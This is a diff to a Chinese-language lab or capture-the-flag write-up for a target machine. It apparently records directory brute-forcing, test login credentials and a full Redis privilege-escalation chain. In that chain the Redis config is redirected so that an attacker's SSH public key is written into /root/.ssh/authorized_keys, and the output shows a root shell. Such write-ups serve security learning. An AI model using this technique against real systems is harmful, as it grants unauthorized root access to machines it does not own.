@@ -5,6 +5,7 @@
 ![image.png|474](https://gitee.com/fogpost/photo/raw/master/202603021105276.png)
 目录爆破
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603031209933.png)
+## 渗透测试
 登录页面测试账户密码（这个只能纯测试么）
 admin：this_is_NOT_the_real_admin_password_please_change_it
 guest：guest123
@@ -89,7 +90,47 @@ save 300 10
 save 60 10000
 ```
 
-提权流程
-生成rsa密钥
-ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
-> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9Gl4KbuGTBiFCzlJgJxk8cFx2MxiJf6R0v7QNJUhXkvIBxPSiDNVs1eVjheT23hn671PceSWNffn6vdLRwjDqQ8JW72nNBrkI9bcHtrCOgVQGtp8rotmqXkS5N0A0QZ+syI1w1LF8b0zNuZY+39dgR8HJoKXn7AnJqSoF1wGcdh+CpBfo2zI1ze07GlZXh7A6dUu0Z1dtHgtjpYo5wng2S7AEZMS6rBBl7aqH7CHzo6P2OMNMJonbxLscXKoKnp9g4hNndgqhAwzgCiyVlqqEH/VUQEnZA+P8HgP4WhmSbuwwtKNnxyRRUpsMpmMq6fMc2KAnKrSukpfji8+viXmv root@kali
+## 提权流程 
+### 生成rsa密钥,Rrdisd攻击链
+```
+> ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
+> cat ~/.ssh/id_rsa.pub
+
+Deprecation:~$ cp /etc/redis.conf /tmp/redis.conf.bak
+Deprecation:~$ echo 'dir /root/.ssh' >> /etc/redis.conf
+Deprecation:~$ echo 'dbfilename authorized_keys' >> /etc/redis.conf
+Deprecation:~$ sudo /sbin/rc-service redis restart
+* Starting redis ...
+[ ok ]
+
+Deprecation:~$ redis-cli -h 127.0.0.1 -p 6379 -a mypassword123
+Warning: Using a password with '-a' or '-u' option on the command line interface may not be
+safe.
+127.0.0.1:6379> CONFIG GET dir
+1) "dir"
+2) "/root/.ssh"
+127.0.0.1:6379> CONFIG GET dbfilename
+3) "dbfilename"
+4) "authorized_keys"
+127.0.0.1:6379> SET ssh_key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9Gl4KbuGTBiFCzlJgJxk8cFx2MxiJf6R0v7QNJUhXkvIBxPSiDNVs1eVjheT23hn671PceSWNffn6vdLRwjDqQ8JW72nNBrkI9bcHtrCOgVQGtp8rotmqXkS5N0A0QZ+syI1w1LF8b0zNuZY+39dgR8HJoKXn7AnJqSoF1wGcdh+CpBfo2zI1ze07GlZXh7A6dUu0Z1dtHgtjpYo5wng2S7AEZMS6rBBl7aqH7CHzo6P2OMNMJonbxLscXKoKnp9g4hNndgqhAwzgCiyVlqqEH/VUQEnZA+P8HgP4WhmSbuwwtKNnxyRRUpsMpmMq6fMc2KAnKrSukpfji8+viXmv root@kali\n\n"
+OK
+127.0.0.1:6379> SAVE
+OK
+
+ssh -i ~/.ssh/id_rsa root@172.27.63.234
+              _                          
+__      _____| | ___ ___  _ __ ___   ___ 
+\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
+ \ V  V /  __/ | (_| (_) | | | | | |  __/
+  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
+                                         
+Deprecation:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+### 加载恶意模块
+
+
+## tips
+注册页面可以用来爆破，之前我还没看出来是注册的。总体来说还是有步骤一步一步完成的，证明实力还是不够
+
+总结：本靶机知识点redis提权
